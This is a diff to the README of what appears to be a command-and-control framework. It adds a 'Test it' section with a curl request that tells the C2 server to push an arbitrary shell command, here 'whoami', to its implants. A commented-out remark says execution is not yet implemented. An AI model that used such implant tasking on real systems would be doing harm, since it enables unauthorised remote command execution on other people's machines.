@@ -139,7 +139,24 @@ python3 server.py
     ```
 
 </details>
+<details>
+<summary>🧪 <strong>Test it: Send a Command</strong></summary>
 
+Once your C2 server and at least one implant are running, you can test sending a command to the mesh using a simple `curl` request (no dashboard yet):
+
+```sh
+curl -X POST http://localhost:8000/admin/send-command \
+    -H "Content-Type: application/json" \
+    -d '{"cmd": "whoami"}'
+```
+
+- You can see the output on the implant logs
+- Replace `whoami` with any command you want to send to the implants
+- Adjust the URL/port if your C2 server is running elsewhere
+
+
+<!-- > The command will be distributed through the mesh, but **actual execution is not implemented yet** (see roadmap above). -->
+</details>
 
 ## 🖼️ Architecture
 
